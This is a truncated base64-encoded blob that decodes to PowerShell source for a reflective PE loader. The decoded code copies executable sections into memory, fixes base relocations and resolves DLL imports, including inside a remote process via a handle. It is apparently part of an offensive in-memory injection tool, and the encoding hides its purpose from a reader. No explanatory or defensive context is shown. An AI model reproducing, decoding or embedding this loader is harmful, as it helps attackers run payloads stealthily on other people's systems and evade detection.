dWFsU2l6ZSBpcyB0aGUgbWluaW11bSBzcGFjZSB0aGF0IGNhbiBiZSBhbGxvY2F0ZWQKCQkJIyAgICBpbiBtZW1vcnkgZm9yIHRoZSBzZWN0aW9uLiBJZiBWaXJ0dWFsU2l6ZSA+IFNpemVPZlJhd0RhdGEsIHBhZCB0aGUgZXh0cmEgc3BhY2VzIHdpdGggMC4gSWYKCQkJIyAgICBTaXplT2ZSYXdEYXRhID4gVmlydHVhbFNpemUsIGl0IGlzIGJlY2F1c2UgdGhlIHNlY3Rpb24gc3RvcmVkIG9uIGRpc2sgaGFzIHBhZGRpbmcgdGhhdCB3ZSBjYW4gdGhyb3cgYXdheSwKCQkJIyAgICBzbyB0cnVuY2F0ZSBTaXplT2ZSYXdEYXRhIHRvIFZpcnR1YWxTaXplCgkJCSRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuU2l6ZU9mUmF3RGF0YQoKCQkJaWYgKCRTZWN0aW9uSGVhZGVyLlBvaW50ZXJUb1Jhd0RhdGEgLWVxIDApCgkJCXsKCQkJCSRTaXplT2ZSYXdEYXRhID0gMAoJCQl9CgkJCQoJCQlpZiAoJFNpemVPZlJhd0RhdGEgLWd0ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplKQoJCQl7CgkJCQkkU2l6ZU9mUmF3RGF0YSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCgkJCX0KCQkJCgkJCWlmICgkU2l6ZU9mUmF3RGF0YSAtZ3QgMCkKCQkJewoJCQkJVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiQ29weS1TZWN0aW9uczo6TWFyc2hhbENvcHkiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uRGVzdEFkZHIgLVNpemUgJFNpemVPZlJhd0RhdGEgfCBPdXQtTnVsbAoJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkUEVCeXRlcywgW0ludDMyXSRTZWN0aW9uSGVhZGVyLlBvaW50ZXJUb1Jhd0RhdGEsICRTZWN0aW9uRGVzdEFkZHIsICRTaXplT2ZSYXdEYXRhKQoJCQl9CgkJCgkJCSNJZiBTaXplT2ZSYXdEYXRhIGlzIGxlc3MgdGhhbiBWaXJ0dWFsU2l6ZSwgc2V0IG1lbW9yeSB0byAwIGZvciB0aGUgZXh0cmEgc3BhY2UKCQkJaWYgKCRTZWN0aW9uSGVhZGVyLlNpemVPZlJhd0RhdGEgLWx0ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplKQoJCQl7CgkJCQkkRGlmZmVyZW5jZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplIC0gJFNpemVPZlJhd0RhdGEKCQkJCVtJbnRQdHJdJFN0YXJ0QWRkcmVzcyA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFNlY3Rpb25EZXN0QWRkcikgKFtJbnQ2NF0kU2l6ZU9mUmF3RGF0YSkpCgkJCQlUZXN0LU1lbW9yeVJhbmdlVmFsaWQgLURlYnVnU3RyaW5nICJDb3B5LVNlY3Rpb25zOjpNZW1zZXQiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTdGFydEFkZHJlc3MgLVNpemUgJERpZmZlcmVuY2UgfCBPdXQtTnVsbAoJCQkJJFdpbjMyRnVuY3Rpb25zLm1lbXNldC5JbnZva2UoJFN0YXJ0QWRkcmVzcywgMCwgW0ludFB0cl0kRGlmZmVyZW5jZSkgfCBPdXQtTnVsbAoJCQl9CgkJfQoJfQoKCglGdW5jdGlvbiBVcGRhdGUtTWVtb3J5QWRkcmVzc2VzCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkUEVJbmZvLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRPcmlnaW5hbEltYWdlQmFzZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkNvbnN0YW50cywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzCgkJKQoJCQoJCVtJbnQ2NF0kQmFzZURpZmZlcmVuY2UgPSAwCgkJJEFkZERpZmZlcmVuY2UgPSAkdHJ1ZSAjVHJhY2sgaWYgdGhlIGRpZmZlcmVuY2UgdmFyaWFibGUgc2hvdWxkIGJlIGFkZGVkIG9yIHN1YnRyYWN0ZWQgZnJvbSB2YXJpYWJsZXMKCQlbVUludDMyXSRJbWFnZUJhc2VSZWxvY1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfQkFTRV9SRUxPQ0FUSU9OKQoJCQoJCSNJZiB0aGUgUEUgd2FzIGxvYWRlZCB0byBpdHMgZXhwZWN0ZWQgYWRkcmVzcyBvciB0aGVyZSBhcmUgbm8gZW50cmllcyBpbiB0aGUgQmFzZVJlbG9jYXRpb25UYWJsZSwgbm90aGluZyB0byBkbwoJCWlmICgoJE9yaWdpbmFsSW1hZ2VCYXNlIC1lcSBbSW50NjRdJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgYAoJCQkJLW9yICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplIC1lcSAwKSkKCQl7CgkJCXJldHVybgoJCX0KCgoJCWVsc2VpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJE9yaWdpbmFsSW1hZ2VCYXNlKSAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkpIC1lcSAkdHJ1ZSkKCQl7CgkJCSRCYXNlRGlmZmVyZW5jZSA9IFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkICgkT3JpZ2luYWxJbWFnZUJhc2UpICgkUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKQoJCQkkQWRkRGlmZmVyZW5jZSA9ICRmYWxzZQoJCX0KCQllbHNlaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpICgkT3JpZ2luYWxJbWFnZUJhc2UpKSAtZXEgJHRydWUpCgkJewoJCQkkQmFzZURpZmZlcmVuY2UgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkgKCRPcmlnaW5hbEltYWdlQmFzZSkKCQl9CgkJCgkJI1VzZSB0aGUgSU1BR0VfQkFTRV9SRUxPQ0FUSU9OIHN0cnVjdHVyZSB0byBmaW5kIG1lbW9yeSBhZGRyZXNzZXMgd2hpY2ggbmVlZCB0byBiZSBtb2RpZmllZAoJCVtJbnRQdHJdJEJhc2VSZWxvY1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQmFzZVJlbG9jYXRpb25UYWJsZS5WaXJ0dWFsQWRkcmVzcykpCgkJd2hpbGUoJHRydWUpCgkJewoJCQkjSWYgU2l6ZU9mQmxvY2sgPT0gMCwgd2UgYXJlIGRvbmUKCQkJJEJhc2VSZWxvY2F0aW9uVGFibGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkQmFzZVJlbG9jUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pCgoJCQlpZiAoJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2sgLWVxIDApCgkJCXsKCQkJCWJyZWFrCgkJCX0KCgkJCVtJbnRQdHJdJE1lbUFkZHJCYXNlID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRCYXNlUmVsb2NhdGlvblRhYmxlLlZpcnR1YWxBZGRyZXNzKSkKCQkJJE51bVJlbG9jYXRpb25zID0gKCRCYXNlUmVsb2NhdGlvblRhYmxlLlNpemVPZkJsb2NrIC0gJEltYWdlQmFzZVJlbG9jU2l6ZSkgLyAyCgoJCQkjTG9vcCB0aHJvdWdoIGVhY2ggcmVsb2NhdGlvbgoJCQlmb3IoJGkgPSAwOyAkaSAtbHQgJE51bVJlbG9jYXRpb25zOyAkaSsrKQoJCQl7CgkJCQkjR2V0IGluZm8gZm9yIHRoaXMgcmVsb2NhdGlvbgoJCQkJJFJlbG9jYXRpb25JbmZvUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnRQdHJdJEJhc2VSZWxvY1B0cikgKFtJbnQ2NF0kSW1hZ2VCYXNlUmVsb2NTaXplICsgKDIgKiAkaSkpKQoJCQkJW1VJbnQxNl0kUmVsb2NhdGlvbkluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUmVsb2NhdGlvbkluZm9QdHIsIFtUeXBlXVtVSW50MTZdKQoKCQkJCSNGaXJzdCA0IGJpdHMgaXMgdGhlIHJlbG9jYXRpb24gdHlwZSwgbGFzdCAxMiBiaXRzIGlzIHRoZSBhZGRyZXNzIG9mZnNldCBmcm9tICRNZW1BZGRyQmFzZQoJCQkJW1VJbnQxNl0kUmVsb2NPZmZzZXQgPSAkUmVsb2NhdGlvbkluZm8gLWJhbmQgMHgwRkZGCgkJCQlbVUludDE2XSRSZWxvY1R5cGUgPSAkUmVsb2NhdGlvbkluZm8gLWJhbmQgMHhGMDAwCgkJCQlmb3IgKCRqID0gMDsgJGogLWx0IDEyOyAkaisrKQoJCQkJewoJCQkJCSRSZWxvY1R5cGUgPSBbTWF0aF06OkZsb29yKCRSZWxvY1R5cGUgLyAyKQoJCQkJfQoKCQkJCSNGb3IgRExMJ3MgdGhlcmUgYXJlIHR3byB0eXBlcyBvZiByZWxvY2F0aW9ucyB1c2VkIGFjY29yZGluZyB0byB0aGUgZm9sbG93aW5nIE1TRE4gYXJ0aWNsZS4gT25lIGZvciA2NGJpdCBhbmQgb25lIGZvciAzMmJpdC4KCQkJCSNUaGlzIGFwcGVhcnMgdG8gYmUgdHJ1ZSBmb3IgRVhFJ3MgYXMgd2VsbC4KCQkJCSMJU2l0ZTogaHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9tYWdhemluZS9jYzMwMTgwOC5hc3B4CgkJCQlpZiAoKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfSElHSExPVykgYAoJCQkJCQktb3IgKCRSZWxvY1R5cGUgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfRElSNjQpKQoJCQkJewkJCQoJCQkJCSNHZXQgdGhlIGN1cnJlbnQgbWVtb3J5IGFkZHJlc3MgYW5kIHVwZGF0ZSBpdCBiYXNlZCBvZmYgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiBQRSBleHBlY3RlZCBiYXNlIGFkZHJlc3MgYW5kIGFjdHVhbCBiYXNlIGFkZHJlc3MKCQkJCQlbSW50UHRyXSRGaW5hbEFkZHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRNZW1BZGRyQmFzZSkgKFtJbnQ2NF0kUmVsb2NPZmZzZXQpKQoJCQkJCVtJbnRQdHJdJEN1cnJBZGRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEZpbmFsQWRkciwgW1R5cGVdW0ludFB0cl0pCgkJCgkJCQkJaWYgKCRBZGREaWZmZXJlbmNlIC1lcSAkdHJ1ZSkKCQkJCQl7CgkJCQkJCVtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKQoJCQkJCX0KCQkJCQllbHNlCgkJCQkJewoJCQkJCQlbSW50UHRyXSRDdXJyQWRkciA9IFtJbnRQdHJdKFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEN1cnJBZGRyKSAoJEJhc2VEaWZmZXJlbmNlKSkKCQkJCQl9CQkJCQoKCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ3VyckFkZHIsICRGaW5hbEFkZHIsICRmYWxzZSkgfCBPdXQtTnVsbAoJCQkJfQoJCQkJZWxzZWlmICgkUmVsb2NUeXBlIC1uZSAkV2luMzJDb25zdGFudHMuSU1BR0VfUkVMX0JBU0VEX0FCU09MVVRFKQoJCQkJewoJCQkJCSNJTUFHRV9SRUxfQkFTRURfQUJTT0xVVEUgaXMganVzdCB1c2VkIGZvciBwYWRkaW5nLCB3ZSBkb24ndCBhY3R1YWxseSBkbyBhbnl0aGluZyB3aXRoIGl0CgkJCQkJVGhyb3cgIlVua25vd24gcmVsb2NhdGlvbiBmb3VuZCwgcmVsb2NhdGlvbiB2YWx1ZTogJFJlbG9jVHlwZSwgcmVsb2NhdGlvbmluZm86ICRSZWxvY2F0aW9uSW5mbyIKCQkJCX0KCQkJfQoJCQkKCQkJJEJhc2VSZWxvY1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEJhc2VSZWxvY1B0cikgKFtJbnQ2NF0kQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jaykpCgkJfQoJfQoKCglGdW5jdGlvbiBJbXBvcnQtRGxsSW1wb3J0cwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFBFSW5mbywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMkZ1bmN0aW9ucywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyQ29uc3RhbnRzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkZmFsc2UpXQoJCVtJbnRQdHJdCgkJJFJlbW90ZVByb2NIYW5kbGUKCQkpCgkJCgkJJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2UKCQlpZiAoJFBFSW5mby5QRUhhbmRsZSAtbmUgJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkKCQl7CgkJCSRSZW1vdGVMb2FkaW5nID0gJHRydWUKCQl9CgkJCgkJaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5TaXplIC1ndCAwKQoJCXsKCQkJW0ludFB0cl0kSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCgkJCQoJCQl3aGlsZSAoJHRydWUpCgkJCXsKCQkJCSRJbXBvcnREZXNjcmlwdG9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEltcG9ydERlc2NyaXB0b3JQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKQoJCQkJCgkJCQkjSWYgdGhlIHN0cnVjdHVyZSBpcyBudWxsLCBpdCBzaWduYWxzIHRoYXQgdGhpcyBpcyB0aGUgZW5kIG9mIHRoZSBhcnJheQoJCQkJaWYgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcyAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuayAtZXEgMCBgCgkJCQkJCS1hbmQgJEltcG9ydERlc2NyaXB0b3IuRm9yd2FyZGVyQ2hhaW4gLWVxIDAgYAoJCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLk5hbWUgLWVxIDAgYAoJCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLlRpbWVEYXRlU3RhbXAgLWVxIDApCgkJCQl7CgkJCQkJV3JpdGUtVmVyYm9zZSAiRG9uZSBpbXBvcnRpbmcgRExMIGltcG9ydHMiCgkJCQkJYnJlYWsKCQkJCX0KCgkJCQkkSW1wb3J0RGxsSGFuZGxlID0gW0ludFB0cl06Olplcm8KCQkJCSRJbXBvcnREbGxQYXRoUHRyID0gKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kSW1wb3J0RGVzY3JpcHRvci5OYW1lKSkKCQkJCSRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKQoJCQkJCgkJCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCQkJewoJCQkJCSRJbXBvcnREbGxIYW5kbGUgPSBJbXBvcnQtRGxsSW5SZW1vdGVQcm9jZXNzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1JbXBvcnREbGxQYXRoUHRyICRJbXBvcnREbGxQYXRoUHRyCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJEltcG9ydERsbEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5Mb2FkTGlicmFyeS5JbnZva2UoJEltcG9ydERsbFBhdGgpCgkJCQl9CgoJCQkJaWYgKCgkSW1wb3J0RGxsSGFuZGxlIC1lcSAkbnVsbCkgLW9yICgkSW1wb3J0RGxsSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpCgkJCQl7CgkJCQkJdGhyb3cgIkVycm9yIGltcG9ydGluZyBETEwsIERMTE5hbWU6ICRJbXBvcnREbGxQYXRoIgoJCQkJfQoJCQkJCgkJCQkjR2V0IHRoZSBmaXJzdCB0aHVuaywgdGhlbiBsb29wIHRocm91Z2ggYWxsIG9mIHRoZW0KCQkJCVtJbnRQdHJdJFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rKQoJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzKSAjQ2hhcmFjdGVyaXN0aWNzIGlzIG92ZXJsb2FkZWQgd2l0aCBPcmlnaW5hbEZpcnN0VGh1bmsKCQkJCVtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWZWYWwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JpZ2luYWxUaHVua1JlZiwgW1R5cGVdW0ludFB0cl0pCgkJCQkKCQkJCXdoaWxlICgkT3JpZ2luYWxUaHVua1JlZlZhbCAtbmUgW0ludFB0cl06Olplcm8pCgkJCQl7CiAgICAgICAgICAgICAgICAgICAgJExvYWRCeU9yZGluYWwgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludFB0cl06Olplcm8KCQkJCQkjQ29tcGFyZSB0aHVua1JlZlZhbCB0byBJTUFHRV9PUkRJTkFMX0ZMQUcsIHdoaWNoIGlzIGRlZmluZWQgYXMgMHg4MDAwMDAwMCBvciAweDgwMDAwMDAwMDAwMDAwMDAgZGVwZW5kaW5nIG9uIDMyYml0IG9yIDY0Yml0CgkJCQkJIwlJZiB0aGUgdG9wIGJpdCBpcyBzZXQgb24gYW4gaW50LCBpdCB3aWxsIGJlIG5lZ2F0aXZlLCBzbyBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0IGNhc3RpbmcgdGhpcyB0byB1aW50CgkJCQkJIwlhbmQgZG9pbmcgdGhlIGNvbXBhcmlzb24sIGp1c3Qgc2VlIGlmIGl0IGlzIGxlc3MgdGhhbiAwCgkJCQkJW0ludFB0cl0kTmV3VGh1bmtSZWYgPSBbSW50UHRyXTo6WmVybwoJCQkJCWlmKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDQgLWFuZCBbSW50MzJdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWx0IDApCgkJCQkJewoJCQkJCQlbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCAtYmFuZCAweGZmZmYgI1RoaXMgaXMgYWN0dWFsbHkgYSBsb29rdXAgYnkgb3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAkTG9hZEJ5T3JkaW5hbCA9ICR0cnVlCgkJCQkJfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1lcSA4IC1hbmQgW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1sdCAwKQoJCQkJCXsKCQkJCQkJW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZlZhbCAtYmFuZCAweGZmZmYgI1RoaXMgaXMgYWN0dWFsbHkgYSBsb29rdXAgYnkgb3JkaW5hbAogICAgICAgICAgICAgICAgICAgICAgICAkTG9hZEJ5T3JkaW5hbCA9ICR0cnVlCgkJCQkJfQoJCQkJCWVsc2UKCQkJCQl7CgkJCQkJCVtJbnRQdHJdJFN0cmluZ0FkZHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRPcmlnaW5hbFRodW5rUmVmVmFsKQoJCQkJCQkkU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTdHJpbmdBZGRyIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW1VJbnQxNl0pKQoJCQkJCQkkUHJvY2VkdXJlTmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkU3RyaW5nQWRkcikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxBbnNpKCRQcm9jZWR1cmVOYW1lKQoJCQkJCX0KCQkJCQkKCQkJCQlpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICR0cnVlKQoJCQkJCXsKCQkJCQkJW0ludFB0cl0kTmV3VGh1bmtSZWYgPSBHZXQtUmVtb3RlUHJvY0FkZHJlc3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVJlbW90ZURsbEhhbmRsZSAkSW1wb3J0RGxsSGFuZGxlIC1GdW5jdGlvbk5hbWVQdHIgJFByb2NlZHVyZU5hbWVQdHIgLUxvYWRCeU9yZGluYWwgJExvYWRCeU9yZGluYWwKCQkJCQl9CgkJCQkJZWxzZQoJCQkJCXsKCQkJCSAgICAgICAgW0ludFB0cl0kTmV3VGh1bmtSZWYgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3NJbnRQdHIuSW52b2tlKCRJbXBvcnREbGxIYW5kbGUsICRQcm9jZWR1cmVOYW1lUHRyKQoJCQkJCX0KCQkJCQkKCQkJCQlpZiAoJE5ld1RodW5rUmVmIC1lcSAkbnVsbCAtb3IgJE5ld1RodW5rUmVmIC1lcSBbSW50UHRyXTo6WmVybykKCQkJCQl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTG9hZEJ5T3JkaW5hbCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIk5ldyBmdW5jdGlvbiByZWZlcmVuY2UgaXMgbnVsbCwgdGhpcyBpcyBhbG1vc3QgY2VydGFpbmx5IGEgYnVnIGluIHRoaXMgc2NyaXB0LiBGdW5jdGlvbiBPcmRpbmFsOiAkUHJvY2VkdXJlTmFtZVB0ci4gRGxsOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKCQkJCQkJICAgIFRocm93ICJOZXcgZnVuY3Rpb24gcmVmZXJlbmNlIGlzIG51bGwsIHRoaXMgaXMgYWxtb3N0IGNlcnRhaW5seSBhIGJ1ZyBpbiB0aGlzIHNjcmlwdC4gRnVuY3Rpb246ICRQcm9jZWR1cmVOYW1lLiBEbGw6ICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CgkJCQkJfQoKCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3VGh1bmtSZWYsICRUaHVua1JlZiwgJGZhbHNlKQoJCQkJCQoJCQkJCSRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFRodW5rUmVmKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSkKCQkJCQlbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkpCgkJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmlnaW5hbFRodW5rUmVmLCBbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgICAgICAgICAgICAgI0NsZWFudXAKICAgICAgICAgICAgICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBQcm9jZWR1cmVOYW1lUHRyIGlzIHRoZSBvcmRpbmFsIHZhbHVlIGFuZCBub3QgYWN0dWFsbHkgYSBwb2ludGVyIHRvIGEgYnVmZmVyIHRoYXQgbmVlZHMgdG8gYmUgZnJlZWQKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJExvYWRCeU9yZGluYWwpIC1hbmQgKCRQcm9jZWR1cmVOYW1lUHRyIC1uZSBbSW50UHRyXTo6WmVybykpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2J